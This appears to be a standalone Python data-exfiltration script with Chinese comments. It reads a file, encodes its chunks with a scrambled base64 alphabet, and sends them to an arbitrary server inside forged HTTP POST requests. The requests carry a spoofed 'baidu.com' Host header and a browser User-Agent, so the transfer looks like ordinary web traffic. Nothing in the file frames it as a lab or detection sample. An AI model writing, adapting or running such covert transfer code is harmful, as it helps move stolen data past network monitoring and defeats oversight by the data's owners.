import socket
import base64
import sys

fake_host = "baidu.com"  # 伪造的目标Host

def simple_encrypt(data):
    # 加密逻辑（这里是示例，未实际加密）
    return data  # 当前返回未加密的数据作为示例

def encode_chunk(chunk):
    base64_custom = "abcdefghijpqrzABCKLMNOkDEFGHIJl345678mnoPQRSTUVstuvwxyWXYZ0129+/"
    chunk_base64 = base64.b64encode(chunk, altchars=b'+/').decode('utf-8')
    return chunk_base64.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/', base64_custom))

def get_headers(url_path, content_type, encrypted_chunk):
    headers = f"POST {url_path} HTTP/1.1\r\n"
    headers += f"Host: {fake_host}\r\n"
    headers += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\n"
    headers += "Accept: */*\r\n"
    headers += "Accept-Language: en-US,en;q=0.5\r\n"
    headers += "Accept-Encoding: gzip, deflate, br\r\n"
    headers += "Connection: keep-alive\r\n"
    headers += "Upgrade-Insecure-Requests: 1\r\n"
    headers += f"Content-Type: {content_type}\r\n"
    headers += f"Content-Length: {len(encrypted_chunk)}\r\n"
    headers += "\r\n"
    return headers

def send_file_in_chunks(file_path, server_address, chunk_size=4096):
    content_type = 'application/octet-stream'
    url_path = "/target"

    with open(file_path, 'rb') as f:
        i = 1
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect(server_address)
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                encoded_chunk = encode_chunk(chunk)
                headers = get_headers(url_path, content_type, encoded_chunk)
                sock.sendall(headers.encode('utf-8') + encoded_chunk.encode('utf-8'))
                response = sock.recv(3)
                if response.decode('utf-8') != 'ACK':
                    print("error")
                print(f"Chunk {i} sent. Server responded with: {response.decode('utf-8', errors='ignore')}")
                i += 1
            headers = get_headers(url_path, content_type, '0ver'.encode('utf-8'))
            sock.sendall(headers.encode('utf-8') + '0ver'.encode('utf-8'))

    print("File sent successfully.")

if __name__ == "__main__":
    file_path = sys.argv[1]
    server_address = (sys.argv[2], 80)
    send_file_in_chunks(file_path, server_address)
